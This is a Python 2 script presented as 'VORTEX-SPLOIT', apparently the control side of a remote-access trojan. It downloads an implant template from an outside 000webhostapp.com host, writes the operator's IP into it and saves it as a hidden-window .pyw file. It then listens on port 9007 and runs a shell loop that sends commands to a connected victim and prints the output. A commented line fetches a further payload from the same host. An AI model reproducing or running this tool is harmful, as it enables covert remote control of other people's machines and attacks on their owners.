import socket
import urllib2
import os
import time
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
import base64

os.system("color 0A")
print"""
     _.-^^---....,,--       
 _--                  --_  
<                        >)
|      VORTEX-SPLOIT      | 
 \._                   _./  
    ```--. . , ; .--'''       
          | |   |             
       .-=||  | |=-.   
       `-=#$%&%$#=-'   
          | ;  :|     
 _____.,-#%&$@%#&#~,._____
---------------------------
[+] Loading..."""

mode = raw_input("""
Select an option:
  [0] Create Listener
  [1] Listen
>>> """)

if mode == '0':
    print "[+] Creating A Listener"
    ip = raw_input("Remote Host: ")
    listener = urllib2.urlopen('http://fhibqwdiuyhghf9uwhefiu2hf98uwehfiuw23.000webhostapp.com/vor/Listener.txt').read()
    f = open("out/Listener.pyw","w")
    f.write(listener.replace('YOUR_IP',ip))
    f.close()
    print "File Saved As: Listener.pyw"
    time.sleep(2)
elif mode == '1':
    ip = raw_input("Host: ")
    s.bind((str(ip),9007))
    s.listen(1)
    print "[*] ["+time.ctime()+"]"+" Started Listener"
    c, addr = s.accept()
    print "[+] ["+time.ctime()+"] Connection From: "+str(addr)
    time.sleep(0.5)
    while True:
        cmd = raw_input("Vortex #> ")
        try:
            c.send(cmd)
            print c.recv(4096)
        except Exception as e:
            print e
            time.sleep(2)
            break
#payload = urllib2.urlopen('http://fhibqwdiuyhghf9uwhefiu2hf98uwehfiuw23.000webhostapp.com/vor/payload.txt').read()
else:
    print "Invalid option"

